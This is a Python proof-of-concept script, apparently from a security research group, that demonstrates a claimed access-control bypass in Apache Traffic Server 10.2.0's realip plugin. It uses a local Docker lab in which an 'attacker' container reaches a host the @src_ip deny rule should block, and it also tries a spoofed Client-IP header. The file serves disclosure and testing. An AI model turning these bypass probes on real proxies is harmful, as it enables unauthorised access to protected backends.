#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: ats-realip-plugin-acl (High: 8.1)
#  Vendor: Apache Traffic Server (ASF)
#  Versions: Apache Traffic Server 10.2.0 (b1df7334)
#  Impact: realip PLUGIN ACL fail-open bypasses remap @src_ip deny
#  Requires: experimental realip plus acl.subjects=PLUGIN
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "ats-realip-plugin-acl"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove ATS 10.2.0 realip + acl.subjects=PLUGIN remap @src_ip fail-open."""

import json
import os
import subprocess
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

LABEL = "ats-realip-plugin-acl"
WITNESS = "ATS-REALIP-PLUGIN-ACL-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
ATS_URL = os.environ.get("ATS_URL", "http://127.0.0.1:18770").rstrip("/")
ORIGIN_URL = os.environ.get("ORIGIN_URL", "http://127.0.0.1:18771").rstrip("/")
HERE = Path(__file__).resolve().parent
READY_TIMEOUT_S = 90
INTERNAL_HOST = "internal.lab"
DENIED_HOST = "denied.lab"
ATS_PLUGIN = "ats"
ATS_CONTROL = "ats-control"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def http_get(url: str, host: str | None = None, timeout: int = 5) -> tuple[int, str]:
    headers = {"Host": host} if host else {}
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return int(resp.status), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read().decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        return 0, str(exc.reason)
    except TimeoutError:
        return 0, "timeout"


def wait_http(url: str, host: str | None, name: str) -> bool:
    deadline = time.time() + READY_TIMEOUT_S
    last = "none"
    while time.time() < deadline:
        status, body = http_get(url, host=host, timeout=3)
        snippet = body.replace("\n", " ")[:80]
        last = f"http={status} body={snippet}"
        if status != 0:
            log(f"{name}-ready {last}")
            return True
        log(f"{name}-wait {last}")
        time.sleep(2)
    log(f"{name}-not-ready {last}")
    return False


def sidecar_http(
    service: str,
    target: str,
    host: str,
    path: str = "/",
    method: str = "GET",
    headers: list[str] | None = None,
) -> dict[str, Any]:
    cmd = [
        "docker",
        "compose",
        "-p",
        COMPOSE_PROJECT,
        "exec",
        "-T",
        service,
        "python3",
        "/lab/sidecar_http.py",
        "--url",
        f"http://{target}:8080{path}",
        "--host",
        host,
        "--method",
        method,
    ]
    for header in headers or []:
        cmd.extend(["--header", header])
    proc = subprocess.run(
        cmd,
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=30,
    )
    raw = proc.stdout.strip() or proc.stderr.strip()
    try:
        data = json.loads(raw.splitlines()[-1])
    except (json.JSONDecodeError, IndexError):
        log(f"sidecar-parse-fail service={service} rc={proc.returncode} out={raw[:300]}")
        return {"status": 0, "body": raw, "peer": ""}
    if not isinstance(data, dict):
        return {"status": 0, "body": raw, "peer": ""}
    return data


def summarize(name: str, data: dict[str, Any]) -> tuple[int, str, bool]:
    status = int(data.get("status") or 0)
    body = str(data.get("body") or "")
    has_witness = WITNESS in body
    snippet = body.replace("\n", " ")[:120]
    log(f"{name} http={status} witness={has_witness} body={snippet}")
    return status, body, has_witness


def main() -> int:
    log(f"lab {LABEL} compose={COMPOSE_PROJECT}")
    if not wait_http(f"{ORIGIN_URL}/secret/", None, "origin"):
        return fail("origin-not-ready")
    origin_status, origin_body = http_get(f"{ORIGIN_URL}/secret/")
    if origin_status != 200 or WITNESS not in origin_body:
        return fail(f"origin-missing-witness http={origin_status}")
    if not wait_http(f"{ATS_URL}/", DENIED_HOST, "ats"):
        logs = compose("logs", "--no-color", "--tail=80", "ats")
        log(logs.stdout[-4000:] if logs.stdout else logs.stderr)
        return fail("ats-plugin-not-ready")

    control_probe = sidecar_http("attacker", ATS_CONTROL, DENIED_HOST, "/")
    if int(control_probe.get("status") or 0) == 0:
        logs = compose("logs", "--no-color", "--tail=80", "ats-control")
        log(logs.stdout[-4000:] if logs.stdout else logs.stderr)
        return fail("ats-control-not-ready")
    log(f"ats-control-ready http={control_probe.get('status')}")

    control = sidecar_http("attacker", ATS_CONTROL, INTERNAL_HOST, "/")
    control_status, _, control_witness = summarize("control-peer-src-ip", control)

    poc = sidecar_http("attacker", ATS_PLUGIN, INTERNAL_HOST, "/")
    poc_status, _, poc_witness = summarize("poc-plugin-fail-open", poc)

    spoof = sidecar_http(
        "attacker",
        ATS_PLUGIN,
        INTERNAL_HOST,
        "/",
        headers=["Client-IP: 10.1.2.3"],
    )
    spoof_status, _, spoof_witness = summarize("poc-untrusted-client-ip-ignored", spoof)

    purge = sidecar_http("attacker", ATS_PLUGIN, INTERNAL_HOST, "/", method="PURGE")
    purge_status, _, purge_witness = summarize("session-ip-allow-purge", purge)

    denied = sidecar_http("attacker", ATS_PLUGIN, DENIED_HOST, "/")
    denied_status, denied_body, denied_witness = summarize("denied-map", denied)

    trusted = sidecar_http(
        "trusted",
        ATS_PLUGIN,
        INTERNAL_HOST,
        "/",
        headers=["Client-IP: 10.1.2.3"],
    )
    trusted_status, _, trusted_witness = summarize("intended-trusted-xff", trusted)

    if control_status == 200 and control_witness:
        return fail("control-peer-also-allowed @src_ip-not-constraining")
    if control_status not in {403, 0} and control_witness:
        return fail(f"control-unexpected-witness http={control_status}")
    if control_status != 403:
        return fail(f"control-expected-403 http={control_status}")
    if poc_status != 200 or not poc_witness:
        return fail(f"poc-no-witness http={poc_status}")
    if purge_status != 403 or purge_witness:
        return fail(f"session-purge-not-denied http={purge_status}")
    if denied_status != 200 or "DENIED" not in denied_body or denied_witness:
        return fail(f"denied-map-unexpected http={denied_status}")
    if spoof_status != 200 or not spoof_witness:
        return fail(f"untrusted-header-not-fail-open http={spoof_status}")
    if trusted_status != 200 or not trusted_witness:
        log("intended-trusted-allow-skipped-or-failed (optional)")

    log(
        "SUCCESS "
        f"{LABEL} control-http={control_status} poc-http={poc_status} "
        f"purge-http={purge_status} denied-http={denied_status} "
        f"spoof-http={spoof_status} trusted-http={trusted_status} "
        f"{WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

